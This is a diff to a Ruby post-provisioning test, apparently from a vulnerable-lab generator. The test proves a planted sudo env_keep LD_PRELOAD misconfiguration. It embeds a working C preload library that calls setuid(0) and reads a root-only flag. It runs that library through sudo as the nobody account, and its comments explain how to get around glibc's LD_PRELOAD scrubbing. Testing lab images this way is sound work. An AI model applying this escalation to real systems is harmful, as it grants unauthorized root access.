@@ -49,8 +49,9 @@ class SudoEnvKeepLdPreloadTest < PostProvisionTest
 
     # Tier 3: GTFOBins "sudo" LD_PRELOAD technique (https://gtfobins.github.io/gtfobins/sudo/).
     # sudo keeps LD_PRELOAD (env_keep), so the allowed root command loads an attacker
-    # library whose constructor runs as root. Proven as a disposable unprivileged
-    # account (not baked into the image), reading the root-only flag to confirm root.
+    # library whose constructor runs as root. Proven locally as an existing
+    # unprivileged account (nobody), exactly as the sibling sudo_root_awk module
+    # proves its misconfiguration, by reading the root-only flag (<privilege>=root_rwx).
     tier(3) do
       idx    = strings.index { |s| !s.strip.empty? }
       fname  = idx && leaked[idx]
@@ -58,55 +59,49 @@ class SudoEnvKeepLdPreloadTest < PostProvisionTest
       if fname.nil? || secret.nil? || secret.strip.empty?
         skip_check('tier 3 LD_PRELOAD privesc', 'no leaked flag/string configured to prove a root read', tier: 3)
       else
-        lib_path = '/tmp/secgen_t3_preload.so'
-        # build_sentinel gives a fresh-nonce, world-readable proof file command that
-        # records id + hostname + the flag contents; we run it from inside the library.
-        sentinel, sent_cmd = build_sentinel("cat /root/#{Shellwords.escape(fname)}")
+        flag_path = "/root/#{fname}"
+        lib_path  = '/tmp/secgen_t3_preload.so'
+        # The constructor runs as root inside the sudo-allowed command. It reads the
+        # root-only flag straight to stdout with direct POSIX calls and then _exit(0):
+        # no system()/shell, so nothing can re-enter the preload or block on a child
+        # (the earlier system()-based payload stalled the guest agent), and the host
+        # command never continues past the constructor.
         csrc = <<~C
-          #include <stdlib.h>
+          #include <stdio.h>
           #include <unistd.h>
+          #include <stdlib.h>
+          #include <fcntl.h>
           __attribute__((constructor)) void secgen_t3(void){
             unsetenv("LD_PRELOAD"); setgid(0); setuid(0);
-            system(#{c_string(sent_cmd)});
+            dprintf(1, "secgen_ld_preload uid=%d euid=%d\\n", getuid(), geteuid());
+            int in = open(#{c_string(flag_path)}, O_RDONLY);
+            if (in >= 0){ char b[4096]; ssize_t n; while((n = read(in, b, sizeof b)) > 0) write(1, b, n); close(in); }
+            _exit(0);
           }
         C
-        with_throwaway_ssh_user do |user, _pass|
-          if !compile_preload(csrc, lib_path)
-            skip_check('tier 3 LD_PRELOAD privesc',
-                       'no C compiler on the target or the attacker to build the preload library', tier: 3)
+        if !compile_preload(csrc, lib_path)
+          skip_check('tier 3 LD_PRELOAD privesc',
+                     'no C compiler on the target to build the LD_PRELOAD library', tier: 3)
+        else
+          # Run the allowed root command with LD_PRELOAD set, as the existing
+          # unprivileged nobody account (sudoers allows ALL users). `timeout`
+          # guards against any stall so the guest-agent call always returns.
+          exploit = "timeout 30 sudo -n LD_PRELOAD=#{lib_path} /usr/local/bin/system_status"
+          out  = run_as_user('nobody', exploit, timeout: 60)
+          body = "#{out[:stdout]}\n#{out[:stderr]}"
+          add_evidence('ld_preload_exploit', "echo #{Shellwords.escape(body[0, 2000])}")
+          wanted = secret.strip.lines.first.to_s.strip
+          if body !~ /secgen_ld_preload uid=0\b/
+            fail_check('tier 3 LD_PRELOAD privesc',
+                       "exploit did not run as root (<privilege>=root_rwx); output: #{body.strip[0, 200]}", tier: 3)
+          elsif !wanted.empty? && !body.include?(wanted)
+            fail_check('tier 3 LD_PRELOAD privesc',
+                       "ran as root but did not read #{flag_path}", tier: 3)
           else
-            # On modern glibc the dynamic linker runs sudo (set-user-ID) in
-            # secure-execution mode and strips LD_PRELOAD from its environment,
-            # so exporting it *before* sudo is scrubbed before sudo can re-export
-            # it (ld.so(8), "Secure-execution mode"). The working form passes
-            # LD_PRELOAD as a sudo command-line variable: sudo reads it from argv
-            # and re-exports it to the root command because env_keep permits it.
-            # The inherited form is kept as a fallback for older libc behaviour.
-            attempts = ["sudo -n LD_PRELOAD=#{lib_path} /usr/local/bin/system_status",
-                        "LD_PRELOAD=#{lib_path} sudo -n /usr/local/bin/system_status"]
-            expl = nil
-            body = ''
-            attempts.each do |cmd|
-              expl = run_as_user(user, cmd)
-              body = read_sentinel(sentinel)
-              break if !body.empty? && sentinel_pwned?(body)
-            end
-            if body.empty? || !sentinel_pwned?(body)
-              fail_check('tier 3 LD_PRELOAD privesc',
-                         "exploit left no sentinel (sudo output: #{(expl[:stdout].to_s + expl[:stderr].to_s).strip[0, 200]})",
-                         tier: 3)
-            elsif body !~ /uid=0\(/
-              fail_check('tier 3 LD_PRELOAD privesc',
-                         "command ran but not as root (<privilege>=root_rwx): #{body[/uid=\S+/]}", tier: 3)
-            elsif !body.include?(secret)
-              fail_check('tier 3 LD_PRELOAD privesc',
-                         "ran as root (#{body[/uid=\S+/]}) but did not read /root/#{fname}", tier: 3)
-            else
-              pass_check('tier 3 LD_PRELOAD privesc',
-                         "unprivileged #{user} escalated via sudo env_keep LD_PRELOAD to #{body[/uid=\S+/]} and read /root/#{fname}", tier: 3)
-            end
-            run_vagrant_ssh("rm -f #{lib_path} #{sentinel}")
+            pass_check('tier 3 LD_PRELOAD privesc',
+                       "unprivileged nobody loaded an attacker library via sudo env_keep LD_PRELOAD, ran as root (uid=0) and read #{flag_path}", tier: 3)
           end
+          run_vagrant_ssh("rm -f #{lib_path}")
         end
       end
     end
